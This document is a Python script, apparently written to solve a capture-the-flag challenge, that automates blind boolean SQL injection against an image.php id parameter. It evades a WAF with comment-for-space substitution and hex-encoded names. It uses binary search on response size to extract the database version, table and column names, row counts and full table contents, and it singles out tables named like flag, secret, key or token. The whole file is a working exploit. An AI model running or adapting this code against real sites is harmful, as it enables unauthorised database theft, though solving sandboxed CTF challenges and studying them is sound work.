#!/usr/bin/env python3
"""WebsiteManger - blind SQLi extraction with binary search (fast) + WAF bypass."""
import requests
import urllib.parse

TARGET = "http://challenge-ab97d555c14efe7b.sandbox.ctfhub.com:10800"
IMAGE_SIZE = 6106

def test(condition):
    """Boolean test. Returns True/False/None(blocked)."""
    payload = "1&&(%s)" % condition
    url = "%s/image.php?id=%s" % (TARGET, urllib.parse.quote(payload))
    try:
        r = requests.get(url, timeout=10)
        if "WHAT ARE YOU DOING" in r.text:
            return None
        return len(r.content) == IMAGE_SIZE
    except Exception as e:
        print("    [ERR] %s" % e)
        return False

def extract_string(query, max_len=300):
    """Extract string via binary search on each character (ord). ~8 req/char."""
    # Get length via binary search
    lo, hi = 0, max_len
    length = None
    while lo <= hi:
        mid = (lo + hi) // 2
        r = test("length((%s))>%d" % (query, mid))
        if r is None:
            print("    WAF blocked on length probe!")
            return None
        if r:
            lo = mid + 1
        else:
            # mid is >= actual length, check if mid == length
            r2 = test("length((%s))=%d" % (query, mid))
            if r2 is None:
                print("    WAF blocked on length exact!")
                return None
            if r2:
                length = mid
                break
            hi = mid - 1

    if length is None:
        print("    Could not determine length")
        return None
    if length == 0:
        return ""

    print("    Length: %d, extracting..." % length)

    result = ""
    for pos in range(1, length + 1):
        lo, hi = 0, 255
        while lo <= hi:
            mid = (lo + hi) // 2
            r = test("ord(substr((%s),%d,1))=%d" % (query, pos, mid))
            if r is None:
                print("    WAF blocked at pos %d!" % pos)
                return result  # partial
            if r:
                result += chr(mid)
                break
            lt = test("ord(substr((%s),%d,1))<%d" % (query, pos, mid))
            if lt is None:
                print("    WAF blocked at pos %d!" % pos)
                return result
            if lt:
                hi = mid - 1
            else:
                lo = mid + 1
        if len(result) < pos:
            result += '?'  # fallback

        if pos % 5 == 0 or pos == length:
            print("    [%d/%d] %s" % (pos, length, result))

    return result

# Verify connection
print("=== Connection check ===")
db_check = test("database()='ctf'")
print("  database()='ctf': %s" % db_check)
ver = extract_string("version()", 30)
print("  Version: %s" % ver)

# Extract table names via group_concat (no LIMIT needed, no "table" keyword!)
print("\n=== Extracting tables ===")
tq = "select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()"
table_names = extract_string(tq, 200)

if not table_names:
    print("ERROR: Could not extract table names!")
    exit(1)

tables = [t for t in table_names.split(',') if t]
print("Tables: %s" % tables)

# For each table, extract columns and data
import binascii

for tname in tables:
    print("\n=== Table: %s ===" % tname)

    # Extract columns
    hex_name = binascii.hexlify(tname.encode()).decode()
    cq = "select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x%s" % hex_name
    cols = extract_string(cq, 500)
    if not cols:
        print("  No columns found or error")
        continue
    col_list = [c for c in cols.split(',') if c]
    print("  Columns: %s" % col_list)

    # Check if this table might have a flag
    is_flag_table = any(kw in tname.lower() for kw in ['flag', 'secr', 'key', 'token'])

    # Get row count
    count = 0
    found_count = False
    for i in range(10):
        r = test("(select/**/count(*)/**/from/**/`%s`)=%d" % (tname, i))
        if r is None:
            break
        if r:
            count = i
            found_count = True
            break
    if not found_count:
        # Try greater than check
        for i in range(5):
            r = test("(select/**/count(*)/**/from/**/`%s`)>%d" % (tname, i))
            if r is None or not r:
                count = i
                found_count = True
                break
    print("  Rows: %s" % (count if found_count else "unknown"))

    # Extract data from all tables (small tables only, limit by data length)
    if found_count and count > 0 and count <= 5:
        # Build concat expression for all columns
        concat_parts = []
        for c in col_list:
            concat_parts.append("ifnull(`%s`,char(78,85,76,76))" % c)  # 'NULL' as fallback
        concat_expr = "concat_ws(char(124)," + ",".join(concat_parts) + ")"  # | as separator

        dq = "select/**/group_concat(%s)/**/from/**/`%s`" % (concat_expr, tname)
        data = extract_string(dq, 1000)
        if data:
            print("  Data: %s" % data)
        else:
            print("  No data extracted")
    elif found_count and count > 5:
        print("  Too many rows, skipping data extraction")

print("\n=== Done! ===")
